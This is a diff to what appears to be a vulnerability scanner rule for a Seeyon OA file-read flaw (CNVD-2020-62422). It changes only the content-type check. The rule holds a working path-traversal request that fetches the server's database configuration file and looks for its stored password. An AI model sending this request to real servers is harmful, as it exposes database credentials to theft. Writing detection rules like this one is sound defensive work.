@@ -3,7 +3,7 @@ rules:
   - method: GET
     path: /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
     follow_redirects: false
-    expression: response.status == 200 && response.content_type.icontains("application/x-msdownload;charset=UTF-8") && response.body.bcontains(b"ctpDataSource.password")
+    expression: response.status == 200 && response.content_type.icontains("application/x-msdownload") && response.body.bcontains(b"ctpDataSource.password")
 detail:
   author: Aquilao(https://github.com/Aquilao)
   info: seeyon readfile(CNVD-2020-62422)
